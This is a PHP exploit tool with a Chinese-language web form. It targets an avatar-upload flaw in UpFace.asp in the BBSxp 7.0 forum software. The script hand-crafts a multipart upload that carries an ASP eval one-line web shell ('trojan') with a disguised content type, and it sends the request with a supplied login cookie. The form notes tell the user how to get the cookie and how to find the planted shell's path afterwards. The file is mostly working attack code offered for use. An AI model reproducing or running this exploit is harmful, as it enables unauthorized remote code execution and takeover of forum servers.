<?php
// BBSxp7.0最新版本漏洞利用程序
//by 锦衣夜行 qq:156544632
////////////////////////////////////////////////

$path = $_POST['path'] ? trim($_POST['path']): "";
$file = $_POST['file'] ? trim($_POST['file']) : "/bbsxp/UpFace.asp?menu=up";
$cookie = $_POST['cookie'] ? trim($_POST['cookie']) : "skins=1; ASPSESSIONIDGGQQQOXC=NPNJKJBCNAJKNBIFPJIJHDOP; UserID=12; Userpass=4B63B2E503B25B94709265DDD878AEFB; Onlinetime=2007%2D5%2D1+3%3A32%3A42";
$code = $_POST['code'] ? trim($_POST['code']) : "<%eval(request(\"a\"))%>";
$mm = $_POST['mm'] ? trim($_POST['mm']) : "htr";

if ($path && $code) {
	$target = $path.$file;
	$uinfo = parse_url($target);
	$uinfo['port'] = $uinfo['port'] ? $uinfo['port'] : 80;

	$content = "POST ".$file." HTTP/1.1\r\n";
	$content .= "Accept: */*\r\n";
        $content .= "Referer: ".$target."\r\n";
	$content .= "Accept-Language: zh-cn\r\n";	
	$content .= "Content-Type: multipart/form-data; boundary=---------------------------7d729045503ae\r\n";
        $content .= "Accept-Encoding: gzip, deflate\r\n";
	$content .= "User-Agent: ".$_SERVER["HTTP_USER_AGENT"]."\r\n";
	$content .= "Host: ".$uinfo['host']."\r\n";
	$content .= "Content-length: 218\r\n";
	$content .= "Connection: Keep-Alive\r\n";
        $content .= "Cache-Control: no-cache\r\n";
        $content .= "Cookie: ".$cookie."\r\n";	
        $content .= "\r\n";
	$content .= "-----------------------------7d729045503ae\r\n";
        $content .= "Content-Disposition: form-data; name=\"file\"; filename=\"C:\qq156544632.".$mm."\"\r\n";
        $content .= "Content-Type: image/html\r\n";
        $content .= "\r\n";
        $content .= "$code\r\n";
        $content .= "-----------------------------7d729045503ae--\r\n";
        $content .= "\r\n";
        echo $content;
        //fputs(fopen('data.php','w+'),$content);

	$fd = fsockopen($uinfo['host'], $uinfo['port']);        
	fputs($fd,$content);	
	while($fd && !feof($fd)) {
		$resp .= fread($fd,1024);
	}
	fclose($fd);
	echo $resp;
}



if (function_exists('ini_get')) {
	$onoff = ini_get('register_globals');
} else {
	$onoff = get_cfg_var('register_globals');
}
if ($onoff != 1) {
	@extract($_POST, EXTR_SKIP);
	@extract($_GET, EXTR_SKIP);
	@extract($_COOKIE, EXTR_SKIP);
}
function stripslashes_array(&$array) {
	while(list($key,$var) = each($array)) {
		if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
			if (is_string($var)) {
				$array[$key] = stripslashes($var);
			}
			if (is_array($var))  {
				$array[$key] = stripslashes_array($var);
			}
		}
	}
	return $array;
}
if (get_magic_quotes_gpc()) {
    $_GET = stripslashes_array($_GET);
    $_POST = stripslashes_array($_POST);
    $_COOKIE = stripslashes_array($_COOKIE);
}

set_magic_quotes_runtime(0);
?>
<style type="text/css">
<!--
.STYLE1 {color: #FF0000}
body {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 12px;
}
-->
</style>


<form method="post" action="">
  <p><strong>Path:</strong><br />
    <input type="text" name="path" value="<?php echo $path;?>" />
    Example: <span class="STYLE1">http://www.brave001.com,后面不要带斜杠,谢谢!</span></p>
  <p><strong>File:</strong><br />
    <input type="text" name="file" value="<?php echo $file;?>" />
    注意: <span class="STYLE1">这个不用我说了吧,漏洞出在UpFace.asp,自己看着办!</span> </p>
  <p><strong>Cookie:</strong><br />  
<textarea name="code" cols="50" rows="5"><?php echo $cookie;?></textarea><br \>
注意: <span class="STYLE1">先注册一个用户,登录,得到自己的cookies</span> 
  </p>
  <p><strong>Code:</strong><br />
    <textarea name="code" cols="50" rows="2"><?php echo $code;?></textarea>
    <br />
    注意: <br /><span class="STYLE1">木马内容,呵呵,最好不要改,因为数据包大小变了!</span></p>
<p><strong>mm:</strong><br />
<input type="text" name="mm" value="htr" />
注意: <br /><span class="STYLE1">你的木马传上去的后缀,htr或aspx或php...上传成功之后去论坛看自己的个人资料,头像显示红差,在上面右键属性就可看到马路径!</span><br /><p>
    <input type="submit" name="Submit" value="发送" />
  </p>
</form>
